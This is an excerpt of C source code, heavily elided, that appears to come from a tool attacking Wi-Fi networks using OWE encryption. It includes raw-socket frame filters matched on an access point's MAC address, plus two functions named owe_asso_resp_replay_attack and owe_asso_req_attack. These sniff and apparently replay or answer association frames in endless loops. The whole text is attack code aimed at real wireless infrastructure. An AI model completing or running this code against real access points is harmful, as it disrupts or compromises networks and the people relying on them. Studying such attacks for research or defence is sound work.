...
//
static bool auth_resp_filter(uint8_t *raw_packet, ap_info ap_info)
{
    return (raw_packet[0] == 0xb0 && memcmp(raw_packet + 10, ap_info.mac, MAC_LEN) == 0);
}

static bool asso_resp_filter(uint8_t *raw_packet, ap_info ap_info)
{
    return (raw_packet[0] == 0x10 && memcmp(raw_packet + 10, ap_info.mac, MAC_LEN) == 0);
}

static bool asso_req_filter(uint8_t *raw_packet, ap_info ap_info)
{
    return (raw_packet[0] == 0x00 && memcmp(raw_packet + 4, ap_info.mac, MAC_LEN) == 0);
}
...
int owe_asso_resp_replay_attack(int raw_socket, const ap_info *ap, const intf_info *intf)
{
    ...
    size_t auth_resp_size = sniff(raw_socket, auth_response, auth_resp_filter, *ap, 50); //arbitrary packet limit
    ...
    if (authenticated)
    {
        ...
        size_t asso_resp_size = sniff(raw_socket, asso_response, asso_resp_filter, *ap, 50); //arbitrary packet limit
    ...
    for (;;)
    {
        int packet_len = sniff(raw_socket, packet, asso_req_filter, *ap, 0);
...
int owe_asso_req_attack(int raw_socket, const ap_info *ap)
{
    ...
    for (;;)
    {
        int packet_len = sniff(raw_socket, packet, auth_resp_filter, *ap, 0);
